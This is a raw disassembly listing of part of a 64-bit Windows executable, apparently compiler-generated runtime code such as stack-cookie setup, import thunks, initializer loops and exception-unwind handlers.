   1400048b9:	cc                   	int3
   1400048ba:	cc                   	int3
   1400048bb:	cc                   	int3
   1400048bc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400048c1:	55                   	push   %rbp
   1400048c2:	48 8b ec             	mov    %rsp,%rbp
   1400048c5:	48 83 ec 30          	sub    $0x30,%rsp
   1400048c9:	48 8b 05 70 37 00 00 	mov    0x3770(%rip),%rax        # 0x140008040
   1400048d0:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400048d7:	2b 00 00 
   1400048da:	48 3b c3             	cmp    %rbx,%rax
   1400048dd:	75 74                	jne    0x140004953
   1400048df:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   1400048e4:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400048e8:	ff 15 ca 07 00 00    	call   *0x7ca(%rip)        # 0x1400050b8
   1400048ee:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400048f2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400048f6:	ff 15 b4 07 00 00    	call   *0x7b4(%rip)        # 0x1400050b0
   1400048fc:	8b c0                	mov    %eax,%eax
   1400048fe:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140004902:	ff 15 a0 07 00 00    	call   *0x7a0(%rip)        # 0x1400050a8
   140004908:	8b c0                	mov    %eax,%eax
   14000490a:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000490e:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140004912:	ff 15 88 07 00 00    	call   *0x788(%rip)        # 0x1400050a0
   140004918:	8b 45 18             	mov    0x18(%rbp),%eax
   14000491b:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000491f:	48 c1 e0 20          	shl    $0x20,%rax
   140004923:	48 33 45 18          	xor    0x18(%rbp),%rax
   140004927:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000492b:	48 33 c1             	xor    %rcx,%rax
   14000492e:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140004935:	ff 00 00 
   140004938:	48 23 c1             	and    %rcx,%rax
   14000493b:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140004942:	2b 00 00 
   140004945:	48 3b c3             	cmp    %rbx,%rax
   140004948:	48 0f 44 c1          	cmove  %rcx,%rax
   14000494c:	48 89 05 ed 36 00 00 	mov    %rax,0x36ed(%rip)        # 0x140008040
   140004953:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004958:	48 f7 d0             	not    %rax
   14000495b:	48 89 05 1e 37 00 00 	mov    %rax,0x371e(%rip)        # 0x140008080
   140004962:	48 83 c4 30          	add    $0x30,%rsp
   140004966:	5d                   	pop    %rbp
   140004967:	c3                   	ret
   140004968:	b8 00 40 00 00       	mov    $0x4000,%eax
   14000496d:	c3                   	ret
   14000496e:	cc                   	int3
   14000496f:	cc                   	int3
   140004970:	48 8d 0d b9 3d 00 00 	lea    0x3db9(%rip),%rcx        # 0x140008730
   140004977:	48 ff 25 42 07 00 00 	rex.W jmp *0x742(%rip)        # 0x1400050c0
   14000497e:	cc                   	int3
   14000497f:	cc                   	int3
   140004980:	b0 01                	mov    $0x1,%al
   140004982:	c3                   	ret
   140004983:	cc                   	int3
   140004984:	48 8d 05 b5 3d 00 00 	lea    0x3db5(%rip),%rax        # 0x140008740
   14000498b:	c3                   	ret
   14000498c:	48 8d 05 b5 3d 00 00 	lea    0x3db5(%rip),%rax        # 0x140008748
   140004993:	c3                   	ret
   140004994:	48 83 ec 28          	sub    $0x28,%rsp
   140004998:	e8 e7 ff ff ff       	call   0x140004984
   14000499d:	48 83 08 24          	orq    $0x24,(%rax)
   1400049a1:	e8 e6 ff ff ff       	call   0x14000498c
   1400049a6:	48 83 08 02          	orq    $0x2,(%rax)
   1400049aa:	48 83 c4 28          	add    $0x28,%rsp
   1400049ae:	c3                   	ret
   1400049af:	cc                   	int3
   1400049b0:	33 c0                	xor    %eax,%eax
   1400049b2:	39 05 e8 36 00 00    	cmp    %eax,0x36e8(%rip)        # 0x1400080a0
   1400049b8:	0f 94 c0             	sete   %al
   1400049bb:	c3                   	ret
   1400049bc:	48 8d 05 bd 3d 00 00 	lea    0x3dbd(%rip),%rax        # 0x140008780
   1400049c3:	c3                   	ret
   1400049c4:	48 8d 05 ad 3d 00 00 	lea    0x3dad(%rip),%rax        # 0x140008778
   1400049cb:	c3                   	ret
   1400049cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400049d1:	57                   	push   %rdi
   1400049d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400049d6:	48 8d 1d 0b 16 00 00 	lea    0x160b(%rip),%rbx        # 0x140005fe8
   1400049dd:	48 8d 3d 04 16 00 00 	lea    0x1604(%rip),%rdi        # 0x140005fe8
   1400049e4:	eb 12                	jmp    0x1400049f8
   1400049e6:	48 8b 03             	mov    (%rbx),%rax
   1400049e9:	48 85 c0             	test   %rax,%rax
   1400049ec:	74 06                	je     0x1400049f4
   1400049ee:	ff 15 b4 08 00 00    	call   *0x8b4(%rip)        # 0x1400052a8
   1400049f4:	48 83 c3 08          	add    $0x8,%rbx
   1400049f8:	48 3b df             	cmp    %rdi,%rbx
   1400049fb:	72 e9                	jb     0x1400049e6
   1400049fd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a02:	48 83 c4 20          	add    $0x20,%rsp
   140004a06:	5f                   	pop    %rdi
   140004a07:	c3                   	ret
   140004a08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a0d:	57                   	push   %rdi
   140004a0e:	48 83 ec 20          	sub    $0x20,%rsp
   140004a12:	48 8d 1d df 15 00 00 	lea    0x15df(%rip),%rbx        # 0x140005ff8
   140004a19:	48 8d 3d d8 15 00 00 	lea    0x15d8(%rip),%rdi        # 0x140005ff8
   140004a20:	eb 12                	jmp    0x140004a34
   140004a22:	48 8b 03             	mov    (%rbx),%rax
   140004a25:	48 85 c0             	test   %rax,%rax
   140004a28:	74 06                	je     0x140004a30
   140004a2a:	ff 15 78 08 00 00    	call   *0x878(%rip)        # 0x1400052a8
   140004a30:	48 83 c3 08          	add    $0x8,%rbx
   140004a34:	48 3b df             	cmp    %rdi,%rbx
   140004a37:	72 e9                	jb     0x140004a22
   140004a39:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a3e:	48 83 c4 20          	add    $0x20,%rsp
   140004a42:	5f                   	pop    %rdi
   140004a43:	c3                   	ret
   140004a44:	cc                   	int3
   140004a45:	cc                   	int3
   140004a46:	cc                   	int3
   140004a47:	cc                   	int3
   140004a48:	cc                   	int3
   140004a49:	cc                   	int3
   140004a4a:	cc                   	int3
   140004a4b:	cc                   	int3
   140004a4c:	cc                   	int3
   140004a4d:	cc                   	int3
   140004a4e:	cc                   	int3
   140004a4f:	cc                   	int3
   140004a50:	ff 25 42 07 00 00    	jmp    *0x742(%rip)        # 0x140005198
   140004a56:	ff 25 2c 07 00 00    	jmp    *0x72c(%rip)        # 0x140005188
   140004a5c:	ff 25 e6 06 00 00    	jmp    *0x6e6(%rip)        # 0x140005148
   140004a62:	ff 25 d8 06 00 00    	jmp    *0x6d8(%rip)        # 0x140005140
   140004a68:	ff 25 e2 06 00 00    	jmp    *0x6e2(%rip)        # 0x140005150
   140004a6e:	ff 25 0c 07 00 00    	jmp    *0x70c(%rip)        # 0x140005180
   140004a74:	ff 25 f6 06 00 00    	jmp    *0x6f6(%rip)        # 0x140005170
   140004a7a:	ff 25 40 07 00 00    	jmp    *0x740(%rip)        # 0x1400051c0
   140004a80:	ff 25 32 07 00 00    	jmp    *0x732(%rip)        # 0x1400051b8
   140004a86:	ff 25 e4 07 00 00    	jmp    *0x7e4(%rip)        # 0x140005270
   140004a8c:	ff 25 c6 07 00 00    	jmp    *0x7c6(%rip)        # 0x140005258
   140004a92:	ff 25 b8 07 00 00    	jmp    *0x7b8(%rip)        # 0x140005250
   140004a98:	ff 25 aa 07 00 00    	jmp    *0x7aa(%rip)        # 0x140005248
   140004a9e:	ff 25 9c 07 00 00    	jmp    *0x79c(%rip)        # 0x140005240
   140004aa4:	ff 25 8e 07 00 00    	jmp    *0x78e(%rip)        # 0x140005238
   140004aaa:	ff 25 80 07 00 00    	jmp    *0x780(%rip)        # 0x140005230
   140004ab0:	ff 25 72 07 00 00    	jmp    *0x772(%rip)        # 0x140005228
   140004ab6:	ff 25 24 07 00 00    	jmp    *0x724(%rip)        # 0x1400051e0
   140004abc:	ff 25 5e 07 00 00    	jmp    *0x75e(%rip)        # 0x140005220
   140004ac2:	ff 25 98 07 00 00    	jmp    *0x798(%rip)        # 0x140005260
   140004ac8:	ff 25 4a 07 00 00    	jmp    *0x74a(%rip)        # 0x140005218
   140004ace:	ff 25 34 07 00 00    	jmp    *0x734(%rip)        # 0x140005208
   140004ad4:	ff 25 26 07 00 00    	jmp    *0x726(%rip)        # 0x140005200
   140004ada:	ff 25 a0 07 00 00    	jmp    *0x7a0(%rip)        # 0x140005280
   140004ae0:	ff 25 12 07 00 00    	jmp    *0x712(%rip)        # 0x1400051f8
   140004ae6:	ff 25 04 07 00 00    	jmp    *0x704(%rip)        # 0x1400051f0
   140004aec:	ff 25 de 06 00 00    	jmp    *0x6de(%rip)        # 0x1400051d0
   140004af2:	ff 25 b8 06 00 00    	jmp    *0x6b8(%rip)        # 0x1400051b0
   140004af8:	ff 25 8a 07 00 00    	jmp    *0x78a(%rip)        # 0x140005288
   140004afe:	ff 25 64 07 00 00    	jmp    *0x764(%rip)        # 0x140005268
   140004b04:	ff 25 9e 06 00 00    	jmp    *0x69e(%rip)        # 0x1400051a8
   140004b0a:	cc                   	int3
   140004b0b:	cc                   	int3
   140004b0c:	48 83 ec 28          	sub    $0x28,%rsp
   140004b10:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140004b14:	48 8b ca             	mov    %rdx,%rcx
   140004b17:	49 8b d1             	mov    %r9,%rdx
   140004b1a:	e8 0d 00 00 00       	call   0x140004b2c
   140004b1f:	b8 01 00 00 00       	mov    $0x1,%eax
   140004b24:	48 83 c4 28          	add    $0x28,%rsp
   140004b28:	c3                   	ret
   140004b29:	cc                   	int3
   140004b2a:	cc                   	int3
   140004b2b:	cc                   	int3
   140004b2c:	40 53                	rex push %rbx
   140004b2e:	45 8b 18             	mov    (%r8),%r11d
   140004b31:	48 8b da             	mov    %rdx,%rbx
   140004b34:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140004b38:	4c 8b c9             	mov    %rcx,%r9
   140004b3b:	41 f6 00 04          	testb  $0x4,(%r8)
   140004b3f:	4c 8b d1             	mov    %rcx,%r10
   140004b42:	74 13                	je     0x140004b57
   140004b44:	41 8b 40 08          	mov    0x8(%r8),%eax
   140004b48:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140004b4c:	f7 d8                	neg    %eax
   140004b4e:	4c 03 d1             	add    %rcx,%r10
   140004b51:	48 63 c8             	movslq %eax,%rcx
   140004b54:	4c 23 d1             	and    %rcx,%r10
   140004b57:	49 63 c3             	movslq %r11d,%rax
   140004b5a:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140004b5e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140004b62:	8b 48 08             	mov    0x8(%rax),%ecx
   140004b65:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004b69:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140004b6e:	74 0b                	je     0x140004b7b
   140004b70:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140004b75:	83 e0 f0             	and    $0xfffffff0,%eax
   140004b78:	4c 03 c8             	add    %rax,%r9
   140004b7b:	4c 33 ca             	xor    %rdx,%r9
   140004b7e:	49 8b c9             	mov    %r9,%rcx
   140004b81:	5b                   	pop    %rbx
   140004b82:	e9 19 f2 ff ff       	jmp    0x140003da0
   140004b87:	cc                   	int3
   140004b88:	48 8b c4             	mov    %rsp,%rax
   140004b8b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004b8f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004b93:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004b97:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004b9b:	41 56                	push   %r14
   140004b9d:	48 83 ec 20          	sub    $0x20,%rsp
   140004ba1:	49 8b 59 38          	mov    0x38(%r9),%rbx
   140004ba5:	48 8b f2             	mov    %rdx,%rsi
   140004ba8:	4d 8b f0             	mov    %r8,%r14
   140004bab:	48 8b e9             	mov    %rcx,%rbp
   140004bae:	49 8b d1             	mov    %r9,%rdx
   140004bb1:	48 8b ce             	mov    %rsi,%rcx
   140004bb4:	49 8b f9             	mov    %r9,%rdi
   140004bb7:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   140004bbb:	e8 6c ff ff ff       	call   0x140004b2c
   140004bc0:	8b 45 04             	mov    0x4(%rbp),%eax
   140004bc3:	24 66                	and    $0x66,%al
   140004bc5:	f6 d8                	neg    %al
   140004bc7:	b8 01 00 00 00       	mov    $0x1,%eax
   140004bcc:	45 1b c0             	sbb    %r8d,%r8d
   140004bcf:	41 f7 d8             	neg    %r8d
   140004bd2:	44 03 c0             	add    %eax,%r8d
   140004bd5:	44 85 43 04          	test   %r8d,0x4(%rbx)
   140004bd9:	74 11                	je     0x140004bec
   140004bdb:	4c 8b cf             	mov    %rdi,%r9
   140004bde:	4d 8b c6             	mov    %r14,%r8
   140004be1:	48 8b d6             	mov    %rsi,%rdx
   140004be4:	48 8b cd             	mov    %rbp,%rcx
   140004be7:	e8 64 fe ff ff       	call   0x140004a50
   140004bec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004bf1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004bf6:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004bfb:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140004c00:	48 83 c4 20          	add    $0x20,%rsp
   140004c04:	41 5e                	pop    %r14
   140004c06:	c3                   	ret
   140004c07:	ff 25 5b 05 00 00    	jmp    *0x55b(%rip)        # 0x140005168
   140004c0d:	ff 25 65 05 00 00    	jmp    *0x565(%rip)        # 0x140005178
   140004c13:	cc                   	int3
   140004c14:	cc                   	int3
   140004c15:	cc                   	int3
   140004c16:	cc                   	int3
   140004c17:	cc                   	int3
   140004c18:	cc                   	int3
   140004c19:	cc                   	int3
   140004c1a:	cc                   	int3
   140004c1b:	cc                   	int3
   140004c1c:	cc                   	int3
   140004c1d:	cc                   	int3
   140004c1e:	cc                   	int3
   140004c1f:	cc                   	int3
   140004c20:	cc                   	int3
   140004c21:	cc                   	int3
   140004c22:	cc                   	int3
   140004c23:	cc                   	int3
   140004c24:	cc                   	int3
   140004c25:	cc                   	int3
   140004c26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004c2d:	00 00 00 
   140004c30:	ff e0                	jmp    *%rax
   140004c32:	cc                   	int3
   140004c33:	cc                   	int3
   140004c34:	cc                   	int3
   140004c35:	cc                   	int3
   140004c36:	cc                   	int3
   140004c37:	cc                   	int3
   140004c38:	cc                   	int3
   140004c39:	cc                   	int3
   140004c3a:	cc                   	int3
   140004c3b:	cc                   	int3
   140004c3c:	cc                   	int3
   140004c3d:	cc                   	int3
   140004c3e:	cc                   	int3
   140004c3f:	cc                   	int3
   140004c40:	cc                   	int3
   140004c41:	cc                   	int3
   140004c42:	cc                   	int3
   140004c43:	cc                   	int3
   140004c44:	cc                   	int3
   140004c45:	cc                   	int3
   140004c46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004c4d:	00 00 00 
   140004c50:	ff 25 52 06 00 00    	jmp    *0x652(%rip)        # 0x1400052a8
   140004c56:	cc                   	int3
   140004c57:	cc                   	int3
   140004c58:	cc                   	int3
   140004c59:	cc                   	int3
   140004c5a:	cc                   	int3
   140004c5b:	cc                   	int3
   140004c5c:	cc                   	int3
   140004c5d:	cc                   	int3
   140004c5e:	cc                   	int3
   140004c5f:	cc                   	int3
   140004c60:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
   140004c67:	e9 74 e1 ff ff       	jmp    0x140002de0
   140004c6c:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140004c73:	e9 68 e1 ff ff       	jmp    0x140002de0
   140004c78:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140004c7f:	e9 5c e1 ff ff       	jmp    0x140002de0
   140004c84:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140004c8b:	e9 50 e1 ff ff       	jmp    0x140002de0
   140004c90:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140004c97:	e9 44 e1 ff ff       	jmp    0x140002de0
   140004c9c:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140004ca3:	e9 38 e1 ff ff       	jmp    0x140002de0
   140004ca8:	48 8d 8a a0 00 00 00 	lea    0xa0(%rdx),%rcx
   140004caf:	e9 2c e1 ff ff       	jmp    0x140002de0
   140004cb4:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140004cbb:	e9 20 e1 ff ff       	jmp    0x140002de0
   140004cc0:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   140004cc7:	e9 14 e1 ff ff       	jmp    0x140002de0
   140004ccc:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140004cd3:	e9 08 e1 ff ff       	jmp    0x140002de0
   140004cd8:	48 8d 8a 38 00 00 00 	lea    0x38(%rdx),%rcx
   140004cdf:	e9 fc e0 ff ff       	jmp    0x140002de0
   140004ce4:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
   140004ceb:	e9 f0 e0 ff ff       	jmp    0x140002de0
   140004cf0:	48 8d 8a e0 00 00 00 	lea    0xe0(%rdx),%rcx
   140004cf7:	e9 e4 e0 ff ff       	jmp    0x140002de0
   140004cfc:	48 8d 8a c0 00 00 00 	lea    0xc0(%rdx),%rcx
   140004d03:	e9 d8 e0 ff ff       	jmp    0x140002de0
   140004d08:	cc                   	int3
   140004d09:	cc                   	int3
   140004d0a:	cc                   	int3
   140004d0b:	cc                   	int3
   140004d0c:	cc                   	int3
   140004d0d:	cc                   	int3
   140004d0e:	cc                   	int3
   140004d0f:	cc                   	int3
   140004d10:	48 8b 8a 20 00 00 00 	mov    0x20(%rdx),%rcx
   140004d17:	48 83 c1 10          	add    $0x10,%rcx
   140004d1b:	e9 c0 e0 ff ff       	jmp    0x140002de0
   140004d20:	48 8b 8a 20 00 00 00 	mov    0x20(%rdx),%rcx
   140004d27:	e9 84 d4 ff ff       	jmp    0x1400021b0
   140004d2c:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140004d33:	e9 a8 e0 ff ff       	jmp    0x140002de0
   140004d38:	48 8d 8a a0 00 00 00 	lea    0xa0(%rdx),%rcx
   140004d3f:	e9 9c e0 ff ff       	jmp    0x140002de0
   140004d44:	48 8d 8a 60 00 00 00 	lea    0x60(%rdx),%rcx
   140004d4b:	e9 90 e0 ff ff       	jmp    0x140002de0
   140004d50:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140004d57:	e9 84 e0 ff ff       	jmp    0x140002de0
   140004d5c:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140004d63:	e9 78 e0 ff ff       	jmp    0x140002de0
   140004d68:	cc                   	int3
   140004d69:	cc                   	int3
   140004d6a:	cc                   	int3
   140004d6b:	cc                   	int3
   140004d6c:	cc                   	int3
   140004d6d:	cc                   	int3
   140004d6e:	cc                   	int3
   140004d6f:	cc                   	int3
   140004d70:	48 8b 8a b8 00 00 00 	mov    0xb8(%rdx),%rcx
   140004d77:	e9 34 d4 ff ff       	jmp    0x1400021b0
   140004d7c:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140004d83:	e9 28 d4 ff ff       	jmp    0x1400021b0
   140004d88:	48 8b 8a 20 00 00 00 	mov    0x20(%rdx),%rcx
   140004d8f:	48 83 c1 10          	add    $0x10,%rcx
   140004d93:	e9 48 e0 ff ff       	jmp    0x140002de0
   140004d98:	48 8b 8a 70 00 00 00 	mov    0x70(%rdx),%rcx
   140004d9f:	e9 0c d4 ff ff       	jmp    0x1400021b0
   140004da4:	48 8b 8a 20 00 00 00 	mov    0x20(%rdx),%rcx
   140004dab:	48 83 c1 10          	add    $0x10,%rcx
   140004daf:	e9 2c e0 ff ff       	jmp    0x140002de0
   140004db4:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   140004dbb:	e9 f0 d3 ff ff       	jmp    0x1400021b0
   140004dc0:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140004dc7:	e9 e4 d3 ff ff       	jmp    0x1400021b0
   140004dcc:	48 8b 8a 20 00 00 00 	mov    0x20(%rdx),%rcx
   140004dd3:	48 83 c1 10          	add    $0x10,%rcx
   140004dd7:	e9 04 e0 ff ff       	jmp    0x140002de0
   140004ddc:	48 8b 8a 70 00 00 00 	mov    0x70(%rdx),%rcx
   140004de3:	e9 c8 d3 ff ff       	jmp    0x1400021b0
   140004de8:	48 8b 8a 20 00 00 00 	mov    0x20(%rdx),%rcx
   140004def:	48 83 c1 10          	add    $0x10,%rcx
   140004df3:	e9 e8 df ff ff       	jmp    0x140002de0
   140004df8:	cc                   	int3
   140004df9:	cc                   	int3
   140004dfa:	cc                   	int3
   140004dfb:	cc                   	int3
   140004dfc:	cc                   	int3
   140004dfd:	cc                   	int3
   140004dfe:	cc                   	int3
   140004dff:	cc                   	int3
   140004e00:	48 8b 8a 38 01 00 00 	mov    0x138(%rdx),%rcx
   140004e07:	e9 a4 d3 ff ff       	jmp    0x1400021b0
   140004e0c:	48 8b 8a 30 01 00 00 	mov    0x130(%rdx),%rcx
   140004e13:	e9 98 d3 ff ff       	jmp    0x1400021b0
   140004e18:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140004e1f:	48 83 c1 10          	add    $0x10,%rcx
   140004e23:	e9 b8 df ff ff       	jmp    0x140002de0
   140004e28:	48 8d 8a 70 01 00 00 	lea    0x170(%rdx),%rcx
   140004e2f:	e9 dc d7 ff ff       	jmp    0x140002610
   140004e34:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140004e3b:	48 83 c1 10          	add    $0x10,%rcx
   140004e3f:	e9 9c df ff ff       	jmp    0x140002de0
   140004e44:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140004e4b:	e9 60 d3 ff ff       	jmp    0x1400021b0
   140004e50:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140004e57:	48 83 c1 10          	add    $0x10,%rcx
   140004e5b:	e9 80 df ff ff       	jmp    0x140002de0
   140004e60:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140004e67:	e9 44 d3 ff ff       	jmp    0x1400021b0
   140004e6c:	48 8b 8a a8 00 00 00 	mov    0xa8(%rdx),%rcx
   140004e73:	48 83 c1 10          	add    $0x10,%rcx
   140004e77:	e9 64 df ff ff       	jmp    0x140002de0
   140004e7c:	48 8b 8a 20 01 00 00 	mov    0x120(%rdx),%rcx
   140004e83:	e9 28 d3 ff ff       	jmp    0x1400021b0
   140004e88:	48 8b 8a a8 00 00 00 	mov    0xa8(%rdx),%rcx
   140004e8f:	e9 1c d3 ff ff       	jmp    0x1400021b0
   140004e94:	cc                   	int3
   140004e95:	cc                   	int3
   140004e96:	cc                   	int3
   140004e97:	cc                   	int3
   140004e98:	cc                   	int3
   140004e99:	cc                   	int3
   140004e9a:	cc                   	int3
   140004e9b:	cc                   	int3
   140004e9c:	cc                   	int3
   140004e9d:	cc                   	int3
   140004e9e:	cc                   	int3
   140004e9f:	cc                   	int3
   140004ea0:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140004ea7:	e9 04 ed ff ff       	jmp    0x140003bb0
   140004eac:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140004eb3:	e9 98 ea ff ff       	jmp    0x140003950
   140004eb8:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004ebd:	55                   	push   %rbp
   140004ebe:	48 83 ec 20          	sub    $0x20,%rsp
   140004ec2:	48 8b ea             	mov    %rdx,%rbp
   140004ec5:	48 8b 55 50          	mov    0x50(%rbp),%rdx
   140004ec9:	48 8b 02             	mov    (%rdx),%rax
   140004ecc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004ed0:	48 03 ca             	add    %rdx,%rcx
   140004ed3:	41 b0 01             	mov    $0x1,%r8b
   140004ed6:	ba 04 00 00 00       	mov    $0x4,%edx
   140004edb:	ff 15 2f 02 00 00    	call   *0x22f(%rip)        # 0x140005110
   140004ee1:	90                   	nop
   140004ee2:	48 b8 00 00 00 00 00 	movabs $0x0,%rax
   140004ee9:	00 00 00 
   140004eec:	48 83 c4 20          	add    $0x20,%rsp
   140004ef0:	5d                   	pop    %rbp
   140004ef1:	c3                   	ret
   140004ef2:	cc                   	int3
   140004ef3:	cc                   	int3
   140004ef4:	cc                   	int3
   140004ef5:	cc                   	int3
   140004ef6:	cc                   	int3
   140004ef7:	cc                   	int3
   140004ef8:	cc                   	int3
   140004ef9:	cc                   	int3
   140004efa:	cc                   	int3
   140004efb:	cc                   	int3
   140004efc:	cc                   	int3
   140004efd:	cc                   	int3
   140004efe:	cc                   	int3
   140004eff:	cc                   	int3
   140004f00:	48 8b 8a 68 00 00 00 	mov    0x68(%rdx),%rcx
   140004f07:	e9 a4 d2 ff ff       	jmp    0x1400021b0
   140004f0c:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140004f13:	e9 98 d2 ff ff       	jmp    0x1400021b0
   140004f18:	48 8b 8a 60 00 00 00 	mov    0x60(%rdx),%rcx
   140004f1f:	48 83 c1 10          	add    $0x10,%rcx
   140004f23:	e9 b8 de ff ff       	jmp    0x140002de0
   140004f28:	40 55                	rex push %rbp
   140004f2a:	48 8b ea             	mov    %rdx,%rbp
   140004f2d:	48 8b 01             	mov    (%rcx),%rax
   140004f30:	33 c9                	xor    %ecx,%ecx
   140004f32:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140004f38:	0f 94 c1             	sete   %cl
   140004f3b:	8b c1                	mov    %ecx,%eax
   140004f3d:	5d                   	pop    %rbp
   140004f3e:	c3                   	ret
   140004f3f:	cc                   	int3
   140004f40:	40 55                	rex push %rbp
   140004f42:	48 83 ec 20          	sub    $0x20,%rsp
   140004f46:	48 8b ea             	mov    %rdx,%rbp
   140004f49:	48 8b 01             	mov    (%rcx),%rax
   140004f4c:	48 8b d1             	mov    %rcx,%rdx
   140004f4f:	8b 08                	mov    (%rax),%ecx
   140004f51:	e8 54 fb ff ff       	call   0x140004aaa
   140004f56:	90                   	nop
   140004f57:	48 83 c4 20          	add    $0x20,%rsp
   140004f5b:	5d                   	pop    %rbp
   140004f5c:	c3                   	ret
   140004f5d:	cc                   	int3
   140004f5e:	cc                   	int3
   140004f5f:	cc                   	int3
   140004f60:	48 8b 0d e9 37 00 00 	mov    0x37e9(%rip),%rcx        # 0x140008750
   140004f67:	48 85 c9             	test   %rcx,%rcx
   140004f6a:	74 07                	je     0x140004f73
   140004f6c:	48 ff 25 b5 00 00 00 	rex.W jmp *0xb5(%rip)        # 0x140005028
   140004f73:	c3                   	ret
